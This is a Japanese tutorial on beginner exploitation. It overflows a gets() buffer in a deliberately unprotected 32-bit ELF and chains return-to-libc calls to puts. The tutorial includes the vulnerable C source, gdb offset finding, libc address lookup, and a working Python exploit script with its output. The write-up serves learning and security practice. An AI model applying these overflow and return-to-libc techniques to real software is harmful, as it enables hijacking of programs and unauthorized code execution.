# PWNオーバーフロー入門: 関数の戻り番地を書き換えてlibc関数を2回実行(SSP、ASLR、PIE無効で32bitELF)

## はじめに

これはROP (return oriented programming)に向けた練習的位置づけ。
[saru2017/pwn004: PWNオーバーフロー入門: 関数の戻り番地を書き換えてlibc経由でシェルを起動(SSP、ASLR、PIE無効で32bitELF)](https://github.com/saru2017/pwn004)みたいな攻撃をreturn-to-libcと言うらしい。return-to-libcを何回か繰り返してstack外で任意のプログラムを実行するということをやっている。

前回の[saru2017/pwn004: PWNオーバーフロー入門: 関数の戻り番地を書き換えてlibc経由でシェルを起動(SSP、ASLR、PIE無効で32bitELF)](https://github.com/saru2017/pwn004)はsystemを1回叩くだけだったのを、今回は複数回叩く。
しかも「`/bin/sh`」の文字列もlibcの中のやつを使うのでbufのアドレスを知らなくても行けると言う。

## 脆弱性のあるコード

### コード本体

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void saru()
{
  char buf[128];

  gets(buf);
  puts(buf);
}

int main(){
  saru();

  return 0;
}
```

### コンパイル

```bash-statement
saru@lucifen:~/pwn005$ gcc -m32 -fno-stack-protector -no-pie overflow05.c -o overflow05
overflow05.c: In function ‘saru’:
overflow05.c:9:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   gets(buf);
   ^~~~
   fgets
/tmp/cc18mYeK.o: In function `saru':
overflow05.c:(.text+0x20): warning: the `gets' function is dangerous and should not be used.
saru@lucifen:~/pwn005$ 
```

### checksec

```bash-statement
saru@lucifen:~/pwn005$ checksec --file ./overflow05
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   ./overflow05

saru@lucifen:~/pwn005$
```

### 関連するアドレスの位置

## bufからreturn addressまでの距離

gdb-pedaを使う。
たぶん今までと同じなのでbufのアドレスのあと141～144番目なのを確認。
やりかたはgetsのところで「AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAabcd」を張り付けてリターンアドレスがabcdになることで落ちるかを確認。

```
[----------------------------------registers-----------------------------------]
EAX: 0x10
EBX: 0x41414141 ('AAAA')
ECX: 0x6
EDX: 0xf7fc3890 --> 0x0
ESI: 0xf7fc2000 --> 0x1d4d6c
EDI: 0x0
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd4f0 --> 0xf7fe5900 (add    dh,BYTE PTR [ebp+0x6e])
EIP: 0x64636261 ('abcd')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x64636261
[------------------------------------stack-------------------------------------]
0000| 0xffffd4f0 --> 0xf7fe5900 (add    dh,BYTE PTR [ebp+0x6e])
0004| 0xffffd4f4 --> 0xffffd510 --> 0x1
0008| 0xffffd4f8 --> 0x0
0012| 0xffffd4fc --> 0xf7e05e81 (<__libc_start_main+241>:       add    esp,0x10)
0016| 0xffffd500 --> 0xf7fc2000 --> 0x1d4d6c
0020| 0xffffd504 --> 0xf7fc2000 --> 0x1d4d6c
0024| 0xffffd508 --> 0x0
0028| 0xffffd50c --> 0xf7e05e81 (<__libc_start_main+241>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x64636261 in ?? ()
gdb-peda$
```

こんな感じで「`Invalid $PC address: 0x64636261`」で落ちているので成功。
ピッタリ140バイト。

## libc関連のアドレス


### リンクしているライブラリをlddで調べる

```
saru@lucifen:~/pwn005$ ldd ./overflow05
        linux-gate.so.1 (0xf7fd4000)
        libc.so.6 => /lib32/libc.so.6 (0xf7ded000)
        /lib/ld-linux.so.2 (0xf7fd6000)
saru@lucifen:~/pwn005$
```

リンクされているのは/lib32/libc.so.6

### nmコマンドでlibc内のputs関数の相対アドレスを調べる

```
saru@lucifen:~/pwn005$ nm -D /lib32/libc.so.6 | grep "puts"
00065dc0 W fputs
00070260 W fputs_unlocked
00065dc0 T _IO_fputs
00067360 T _IO_puts
00067360 W puts
000fdaf0 T putsgent
000fc250 T putspent
saru@lucifen:~/pwn005$
```

0x00067360

### nmコマンドでlibc内のsystem関数の相対アドレスを調べる

```
saru@lucifen:~/pwn005$ nm -D /lib32/libc.so.6 | grep "system"
0003cd10 T __libc_system
00127190 T svcerr_systemerr
0003cd10 W system
saru@lucifen:~/pwn005$
```

0x0003cd10

### stringsコマンドでlibc内の「/bin/sh」と書いてある場所の相対アドレスを調べる

```
saru@lucifen:~/pwn005$ strings -tx /lib32/libc.so.6 | grep "/bin/sh"
 17b8cf /bin/sh
saru@lucifen:~/pwn005$
```

0x0017b8cf

### gdb-pedaでlibcがロードされている絶対アドレスを調べる

```
gdb-peda$ i proc map
process 29991
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/saru/pwn005/overflow05
         0x8049000  0x804a000     0x1000        0x0 /home/saru/pwn005/overflow05
         0x804a000  0x804b000     0x1000     0x1000 /home/saru/pwn005/overflow05
        0xf7ded000 0xf7fbf000   0x1d2000        0x0 /lib32/libc-2.27.so
        0xf7fbf000 0xf7fc0000     0x1000   0x1d2000 /lib32/libc-2.27.so
        0xf7fc0000 0xf7fc2000     0x2000   0x1d2000 /lib32/libc-2.27.so
        0xf7fc2000 0xf7fc3000     0x1000   0x1d4000 /lib32/libc-2.27.so
        0xf7fc3000 0xf7fc6000     0x3000        0x0
        0xf7fcf000 0xf7fd1000     0x2000        0x0
        0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
        0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
        0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib32/ld-2.27.so
        0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib32/ld-2.27.so
        0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib32/ld-2.27.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
gdb-peda$
```

あれ？2.27じゃん？と思ったら

```
saru@lucifen:~/pwn005$ ls -l /lib32/libc.so.6
lrwxrwxrwx 1 root root 12 Apr 16  2018 /lib32/libc.so.6 -> libc-2.27.so
saru@lucifen:~/pwn005$
```

リンクされてただけだった。
なのでアドレスは0xf7ded000。

## exploitコード

```python
saru@lucifen:~/pwn005$ cat exploit05_stdout.py
import struct
import sys

base_libc = 0xf7ded000
offset_system = 0x0003cd10
offset_puts = 0x00067360
offset_shell = 0x0017b8cf
bufsize = 140

def main():
    buf = b'A' * bufsize
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += struct.pack('<I', base_libc + offset_puts)
    buf += struct.pack('<I', base_libc + offset_shell)
    buf += struct.pack('<I', base_libc + offset_shell)

    sys.stdout.buffer.write(buf)



if __name__ == "__main__":
    main()
```

## 実行結果

2回putsさせることに成功！

```bash-statement
saru@lucifen:~/pwn005$ python exploit05_stdout.py | ./overflow05
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`C▒▒`C▒▒ψ▒▒ψ▒▒
/bin/sh
/bin/sh
Segmentation fault (core dumped)
saru@lucifen:~/pwn005$
```


## 参考リンク

- [Return-to-libcで連続して関数を呼んでみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/24/020347)


